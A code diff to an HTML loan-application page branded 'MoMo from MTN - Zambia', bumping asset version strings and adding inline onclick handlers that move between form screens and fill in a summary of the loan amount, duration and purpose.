@@ -4,7 +4,7 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
   <title>MoMo from MTN - Zambia</title>
-  <link rel="stylesheet" href="style.css?v=20261125c" />
+  <link rel="stylesheet" href="style.css?v=20261125d" />
 </head>
 <body>
   <div class="app-container">
@@ -157,7 +157,12 @@
           <textarea id="loan-purpose" class="input-textarea" placeholder="Describe how you will use this loan...">Business expansion and working capital</textarea>
         </div>
 
-        <button id="btn-form1-next" class="btn-momo-soft" type="button">Next Step →</button>
+        <button
+          id="btn-form1-next"
+          class="btn-momo-soft ready"
+          type="button"
+          onclick="(function(){var a=document.getElementById('form-amount-input');var d=document.getElementById('loan-duration');var p=document.getElementById('loan-purpose');if(document.getElementById('sum-amount'))document.getElementById('sum-amount').innerText='ZMW '+((a&&a.value.trim())||'100,000');if(document.getElementById('sum-duration'))document.getElementById('sum-duration').innerText=(d&&d.value)||'48 Months';if(document.getElementById('sum-purpose'))document.getElementById('sum-purpose').innerText=((p&&p.value.trim())||'Business');document.querySelectorAll('.screen').forEach(function(s){s.classList.remove('active')});document.getElementById('screen-form2').classList.add('active');window.scrollTo(0,0);})()"
+        >Next Step →</button>
       </div>
     </section>
 
@@ -202,7 +207,12 @@
         </div>
 
         <div class="form-buttons-row">
-          <button id="btn-form2-prev" class="btn-grey-action" type="button">← Previous</button>
+          <button
+            id="btn-form2-prev"
+            class="btn-grey-action"
+            type="button"
+            onclick="document.querySelectorAll('.screen').forEach(function(s){s.classList.remove('active')});document.getElementById('screen-form1').classList.add('active');window.scrollTo(0,0);"
+          >← Previous</button>
           <button id="btn-form2-next" class="btn-momo-soft compact-prog" type="button">Next Step →</button>
         </div>
       </div>
@@ -243,7 +253,12 @@
         </div>
 
         <div class="form-buttons-row">
-          <button id="btn-form3-prev" class="btn-grey-action" type="button">← Previous</button>
+          <button
+            id="btn-form3-prev"
+            class="btn-grey-action"
+            type="button"
+            onclick="document.querySelectorAll('.screen').forEach(function(s){s.classList.remove('active')});document.getElementById('screen-form2').classList.add('active');window.scrollTo(0,0);"
+          >← Previous</button>
           <button id="btn-form3-submit" class="btn-momo-solid compact-prog" type="button">SUBMIT APPLICATION</button>
         </div>
       </div>
@@ -428,7 +443,7 @@
 
   </div>
 
-  <script src="script.js?v=20261125c"></script>
+  <script src="script.js?v=20261125d"></script>
 </body>
-      </html>
-  
+          </html>
+          
